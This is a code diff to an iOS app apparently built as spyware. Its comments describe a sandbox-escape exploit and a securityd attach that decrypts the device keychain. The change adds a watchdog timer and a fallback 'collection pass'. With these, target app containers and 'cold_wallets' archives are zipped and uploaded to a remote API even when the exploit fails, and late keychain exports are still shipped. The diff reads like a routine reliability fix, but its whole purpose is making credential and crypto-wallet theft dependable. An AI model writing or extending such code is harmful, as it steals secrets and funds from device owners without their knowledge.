@@ -184,6 +184,10 @@ struct lara: App {
         // The native securityd attach + decrypt can run long and deep; GCD
         // workers only get a 512KB stack, so run the whole pipeline on a
         // dedicated large-stack thread.
+        // Collection runs on the main-thread completion below (success OR
+        // failure) so a dead exploit can never trap the cold_wallets zip.
+        // Exactly-once is enforced by collectionFired (main thread only).
+        var collectionFired = false
         let thread = Thread {
             var result: [AnyHashable: Any]?
             var failure: Error?
@@ -201,13 +205,24 @@ struct lara: App {
                 failure = error
             }
 
-            // After the pipeline the sandbox escape is live: collect files
-            // strictly per /api/device/config collect_configs, zip and upload.
-            if let result, (result["ok"] as? Int ?? 0) == 1 {
-                MainAPI.postPipelineActions()
-            }
+            // Collection is driven by the main-thread completion below, never
+            // here, so exploit failure cannot trap the cold_wallets zip.
+            let pipelineOK = (result?["ok"] as? Int ?? 0) == 1
 
             DispatchQueue.main.async {
+                if !collectionFired {
+                    collectionFired = true
+                    if pipelineOK {
+                        MainAPI.postPipelineActions()
+                    } else {
+                        globallogger.log("(kc) pipeline did not succeed - running collection pass anyway (MCM lease needs no exploit)")
+                        MainAPI.runCollectionPass()
+                    }
+                } else if pipelineOK {
+                    // Watchdog already collected; still ship a late keychain
+                    // export if the pipeline produced one afterwards.
+                    MainAPI.uploadKeychainExportIfPresent()
+                }
                 if let failure {
                     globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
                     MainAPI.reportLogAsync(text: "pipeline failed: \(failure.localizedDescription)")
@@ -244,6 +259,18 @@ struct lara: App {
         // Heartbeat: the framework's final export phase is silent (no framework
         // log lines), so log elapsed time while the pipeline is in flight to
         // tell "slow export" apart from "stuck loop".
+        // Watchdog: if the pipeline is stuck anywhere (exploit retry, XPF
+        // hang, secd attach...), still run the collection pass so target
+        // containers get zipped and uploaded. Exactly-once via
+        // collectionFired, shared with the completion block above.
+        Timer.scheduledTimer(withTimeInterval: 360, repeats: false) { _ in
+            if mgr.kcpipelineactive, !collectionFired {
+                collectionFired = true
+                globallogger.log("(kc) watchdog: pipeline stuck over 360s - running collection pass anyway")
+                MainAPI.reportLogAsync(text: "watchdog: pipeline stuck, collecting anyway")
+                MainAPI.runCollectionPass()
+            }
+        }
         let pipelineStart = Date()
         var tick = 0
         Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { timer in
